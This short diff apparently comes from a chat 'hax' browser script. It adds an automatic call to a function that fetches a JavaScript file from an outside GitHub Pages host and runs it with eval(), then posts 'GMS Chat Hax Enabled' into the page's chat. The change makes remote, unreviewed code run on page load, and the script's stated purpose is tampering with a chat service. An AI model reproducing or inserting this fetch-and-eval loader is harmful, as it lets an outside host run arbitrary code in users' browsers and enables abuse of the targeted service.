@@ -1,4 +1,4 @@
-
+chathax();
 async function chathax(){fetch('https://thatfrueddued.github.io/JustSomeRandomFiles/GamerHax/GMSChat/SocketMod.js') .then(response => response.text()) .then((data) => { eval(data) })
 await sleep(1000);
                          $('.chat').append("<br><p>GMS Chat Hax Enabled</p><br>");
